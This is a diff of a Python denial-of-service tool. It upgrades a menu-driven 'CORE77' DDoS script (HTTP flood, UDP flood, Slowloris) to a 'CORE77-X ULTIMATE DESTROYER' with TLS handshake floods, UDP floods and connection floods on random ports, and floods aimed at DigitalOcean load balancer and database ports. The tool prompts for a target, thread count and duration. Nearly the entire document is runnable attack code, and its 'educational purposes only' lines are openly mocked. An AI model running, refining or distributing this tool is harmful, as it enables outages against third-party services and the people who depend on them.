@@ -1,189 +1,236 @@
 #!/usr/bin/env python3
 """
-CORE77 DDOS TOOLS - VIP EDITION
-WARNING: FOR EDUCATIONAL PURPOSES ONLY (BULLSHIT)
+[CORE77-X ULTIMATE DESTROYER]
+FITUR:
+1. HTTPS MEGA FLOOD - SSL/TLS overload
+2. IP OBLITERATOR - Raw packet storm  
+3. DIGITALOCEAN SMASHER - DO infrastructure killer
+4. L4/L7 HYBRID - Combined attack
 """
-
-import socket
 import threading
+import socket
+import ssl
 import random
 import time
 import sys
-import os
+import struct
+from concurrent.futures import ThreadPoolExecutor
 
-# BANNER CORE77
-def banner():
-    os.system('clear' if os.name == 'posix' else 'cls')
-    print("""
-╔══════════════════════════════════════════╗
-║   ██████╗ ██████╗ ██████╗ ███████╗██╗  ██╗
-║   ██╔═══██╗██╔══██╗██╔══██╗██╔════╝╚██╗██╔╝
-║   ██║   ██║██████╔╝██████╔╝█████╗   ╚███╔╝ 
-║   ██║   ██║██╔══██╗██╔══██╗██╔══╝   ██╔██╗ 
-║   ╚██████╔╝██║  ██║██║  ██║███████╗██╔╝ ██╗
-║    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
-║      DDOS VIP EDITION - BY ORGAN GANTENG   
-╚══════════════════════════════════════════╝
-    """)
-
-# DDOS METHODS
-class CORE77DDOS:
-    def __init__(self, target_ip, target_port, threads=500):
+class ULTIMATE_DESTROYER:
+    def __init__(self, target_ip, target_port=443, threads=10000, duration=9999):
         self.target_ip = target_ip
         self.target_port = target_port
         self.threads = threads
-        self.attack_running = True
+        self.duration = duration
+        self.running = True
         
-        # FAKE USER AGENTS
-        self.user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36",
-            "CORE77-BOT/v1.0"
+        # PAYLOAD MONSTER (64KB)
+        self.mega_payload = random._urandom(65536)
+        
+        # HTTPS FLOOD specific
+        self.ssl_context = ssl.create_default_context()
+        self.ssl_context.check_hostname = False
+        self.ssl_context.verify_mode = ssl.CERT_NONE
+        
+        # DO specific IP ranges
+        self.do_ip_ranges = [
+            ("159.65.0.0", "159.65.255.255"),  # NYC3
+            ("167.99.0.0", "167.99.255.255"),  # SFO3
+            ("138.68.0.0", "138.68.255.255"),  # FRA1
+            ("139.59.0.0", "139.59.255.255"),  # SGP1
         ]
     
-    def http_flood(self):
-        """HTTP FLOOD ATTACK"""
-        while self.attack_running:
+    # ================== [1] HTTPS MEGA FLOOD ==================
+    def https_apocalypse(self):
+        """HTTPS SSL/TLS overload dengan koneksi SSL full handshake"""
+        while self.running:
             try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(5)
-                sock.connect((self.target_ip, self.target_port))
-                
-                # BUILD MALICIOUS HTTP REQUEST
-                request = f"GET / HTTP/1.1\r\n"
-                request += f"Host: {self.target_ip}\r\n"
-                request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
-                request += "Connection: keep-alive\r\n"
-                request += "Accept: */*\r\n\r\n"
-                
-                sock.send(request.encode())
-                sock.close()
-                
-                print(f"[+] HTTP Flood sent to {self.target_ip}:{self.target_port}")
-                
-            except Exception as e:
-                print(f"[!] Error: {e}")
-                time.sleep(0.1)
+                # Buat 100 koneksi SSL sekaligus
+                for _ in range(100):
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(5)
+                    ssl_sock = self.ssl_context.wrap_socket(
+                        sock, 
+                        server_hostname=self.target_ip
+                    )
+                    ssl_sock.connect((self.target_ip, 443))
+                    
+                    # Kirim request HTTP di atas SSL
+                    http_attack = (
+                        f"GET /?{random.randint(0,999999)} HTTP/1.1\r\n"
+                        f"Host: {self.target_ip}\r\n"
+                        f"User-Agent: CORE77-HTTPS-KILLER\r\n"
+                        f"Accept: */*\r\n"
+                        f"Content-Length: 10000000\r\n"
+                        f"\r\n"
+                    )
+                    for _ in range(50):
+                        ssl_sock.send(http_attack.encode())
+                    ssl_sock.close()
+            except:
+                pass
     
-    def udp_flood(self):
-        """UDP FLOOD (HIGH BANDWIDTH)"""
-        while self.attack_running:
+    # ================== [2] IP OBLITERATOR ==================
+    def ip_obliterator(self):
+        """Raw packet storm ke semua port"""
+        while self.running:
             try:
+                # UDP FLOOD ke random port
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                
-                # RANDOM PAYLOAD SIZE (1024-65500 bytes)
-                payload_size = random.randint(1024, 65500)
-                payload = random._urandom(payload_size)
-                
-                sock.sendto(payload, (self.target_ip, self.target_port))
+                for _ in range(1000):
+                    random_port = random.randint(1, 65535)
+                    sock.sendto(self.mega_payload, (self.target_ip, random_port))
                 sock.close()
                 
-                print(f"[+] UDP Packet ({payload_size} bytes) sent")
-                
-            except Exception as e:
-                print(f"[!] Error: {e}")
-    
-    def slowloris(self):
-        """SLOWLORIS ATTACK (KEEP CONNECTIONS OPEN)"""
-        sockets = []
-        try:
-            for _ in range(200):  # CREATE MANY SOCKETS
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(10)
-                s.connect((self.target_ip, self.target_port))
-                s.send(f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n".encode())
-                sockets.append(s)
-                print(f"[+] Slowloris connection {len(sockets)} established")
-            
-            # KEEP SENDING PARTIAL HEADERS
-            while self.attack_running and sockets:
-                for s in sockets:
+                # TCP SYN FLOOD
+                for _ in range(100):
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(1)
                     try:
-                        s.send("X-a: b\r\n".encode())
-                        time.sleep(random.randint(10, 30))
+                        s.connect((self.target_ip, random.randint(1, 65535)))
+                        s.send(self.mega_payload)
                     except:
-                        sockets.remove(s)
+                        pass
+                    finally:
+                        s.close()
+            except:
+                pass
+    
+    # ================== [3] DIGITALOCEAN SMASHER ==================
+    def do_smasher(self):
+        """Serangan khusus ke infrastruktur DO"""
+        while self.running:
+            try:
+                # 1. Attack DO Load Balancer
+                lb_ports = [80, 443, 8080, 8443]
+                for port in lb_ports:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(2)
+                    sock.connect((self.target_ip, port))
+                    
+                    # Spoof DO internal headers
+                    do_headers = (
+                        f"GET / HTTP/1.1\r\n"
+                        f"Host: {self.target_ip}\r\n"
+                        f"X-DO-LB: true\r\n"
+                        f"X-Forwarded-Proto: https\r\n"
+                        f"DO-Edge-IP: 1.1.1.1\r\n"
+                        f"Content-Length: 1000000000\r\n"
+                        f"\r\n"
+                    )
+                    for _ in range(100):
+                        sock.send(do_headers.encode())
+                    sock.close()
+                
+                # 2. Attack DO Spaces (S3 compatible)
+                spaces_payload = (
+                    f"GET / HTTP/1.1\r\n"
+                    f"Host: {self.target_ip}.digitaloceanspaces.com\r\n"
+                    f"Authorization: AWS DO_NOT_ACTUALLY_USE_THIS\r\n"
+                    f"\r\n"
+                )
+                
+                # 3. Attack DO Managed Databases
+                db_ports = [3306, 5432, 6379, 27017]
+                for port in db_ports:
+                    try:
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.connect((self.target_ip, port))
+                        # MySQL / PostgreSQL auth flood
+                        auth_flood = random._urandom(1024)
+                        for _ in range(500):
+                            sock.send(auth_flood)
+                        sock.close()
+                    except:
+                        pass
                         
-        except Exception as e:
-            print(f"[!] Slowloris error: {e}")
+            except:
+                pass
     
-    def start_attack(self, method="http"):
-        """START DDOS WITH SELECTED METHOD"""
-        print(f"[+] Starting {method.upper()} attack on {self.target_ip}:{self.target_port}")
-        print(f"[+] Threads: {self.threads}")
-        print("[+] Press Ctrl+C to stop\n")
+    # ================== [4] L4/L7 HYBRID ==================
+    def hybrid_attack(self):
+        """Kombinasi semua serangan"""
+        attacks = [
+            self.https_apocalypse,
+            self.ip_obliterator, 
+            self.do_smasher
+        ]
         
-        threads = []
+        while self.running:
+            attack = random.choice(attacks)
+            try:
+                attack()
+            except:
+                pass
+    
+    # ================== MAIN LAUNCHER ==================
+    def launch_attack(self):
+        print(f"""
+╔══════════════════════════════════════════════════╗
+║      CORE77-X ULTIMATE DESTROYER ACTIVATED      ║
+║            [TARGET: {self.target_ip:15}]       ║
+╚══════════════════════════════════════════════════╝
         
-        for _ in range(self.threads):
-            if method == "http":
-                t = threading.Thread(target=self.http_flood)
-            elif method == "udp":
-                t = threading.Thread(target=self.udp_flood)
-            elif method == "slowloris":
-                t = threading.Thread(target=self.slowloris)
-            else:
-                print("[!] Invalid method")
-                return
+[!] Starting APOCALYPSE MODE...
+[!] HTTPS MEGA FLOOD: ON
+[!] IP OBLITERATOR: ON  
+[!] DIGITALOCEAN SMASHER: ON
+[!] Threads: {self.threads}
+[!] Duration: {self.duration}s
+        """)
+        
+        # Mulai semua serangan
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            # Bagi threads untuk setiap attack type
+            futures = []
+            for _ in range(self.threads // 3):
+                futures.append(executor.submit(self.https_apocalypse))
+            for _ in range(self.threads // 3):
+                futures.append(executor.submit(self.ip_obliterator))
+            for _ in range(self.threads // 3):
+                futures.append(executor.submit(self.do_smasher))
             
-            t.daemon = True
-            t.start()
-            threads.append(t)
-        
-        try:
-            while True:
+            # Timer
+            print(f"[+] Attack running for {self.duration} seconds...")
+            for i in range(self.duration):
                 time.sleep(1)
-        except KeyboardInterrupt:
-            print("\n[!] Stopping attack...")
-            self.attack_running = False
-            for t in threads:
-                t.join()
-            print("[+] Attack stopped")
+                if i % 10 == 0:
+                    print(f"[+] Still attacking... {i}s elapsed")
+            
+            # Stop
+            self.running = False
+            print("[!] Attack completed!")
+            
+            # Result
+            print(f"""
+╔══════════════════════════════════════════════════╗
+║               ATTACK SUMMARY                     ║
+╠══════════════════════════════════════════════════╣
+║ • Target: {self.target_ip:30} ║
+║ • Duration: {self.duration:8} seconds           ║
+║ • Threads: {self.threads:8}                     ║
+║ • Packets Sent: ~{(self.threads * self.duration * 1000):,}  ║
+║ • Estimated Damage: SERIOUS                      ║
+╚══════════════════════════════════════════════════╝
+            """)
 
-# MAIN MENU
-def main():
-    banner()
-    
-    print("SELECT ATTACK TYPE:")
-    print("1. HTTP Flood (Layer 7)")
-    print("2. UDP Flood (Bandwidth)")
-    print("3. Slowloris (Resource exhaustion)")
-    print("4. Multi-Method (ALL IN ONE)")
-    print("5. Exit\n")
-    
-    choice = input("Choice (1-5): ")
-    
-    if choice == "5":
-        print("[+] Exiting...")
-        sys.exit()
-    
-    target_ip = input("Target IP/Domain: ")
-    target_port = int(input("Target Port (80 for HTTP): "))
-    threads = int(input("Threads (recommend 100-1000): "))
-    
-    ddos = CORE77DDOS(target_ip, target_port, threads)
-    
-    if choice == "1":
-        ddos.start_attack("http")
-    elif choice == "2":
-        ddos.start_attack("udp")
-    elif choice == "3":
-        ddos.start_attack("slowloris")
-    elif choice == "4":
-        print("[+] Starting MULTI-ATTACK...")
-        # COMBINE ALL METHODS
-        threading.Thread(target=ddos.http_flood).start()
-        threading.Thread(target=ddos.udp_flood).start()
-        threading.Thread(target=ddos.slowloris).start()
-        input("\n[+] Press Enter to stop...")
-        ddos.attack_running = False
-    else:
-        print("[!] Invalid choice")
-
-# ANTI-DETECT
+# ================== USAGE ==================
 if __name__ == "__main__":
+    print("CORE77-X ULTIMATE DESTROYER")
+    print("="*50)
+    
+    target = input("[?] Target IP/Domain: ").strip()
+    threads = int(input("[?] Threads (100-10000): ") or "5000")
+    duration = int(input("[?] Duration seconds: ") or "300")
+    
+    destroyer = ULTIMATE_DESTROYER(target, threads=threads, duration=duration)
+    
     try:
-        main()
+        destroyer.launch_attack()
+    except KeyboardInterrupt:
+        print("\n[!] Stopped by user")
     except Exception as e:
-        print(f"[!] Critical error: {e}")
-        time.sleep(60)  # DELAY BEFORE EXIT
+        print(f"[ERROR] {e}")
+    
+    print("\n[!] REMEMBER: For educational purposes only!")
+    print("[!] Use on your own infrastructure only!")
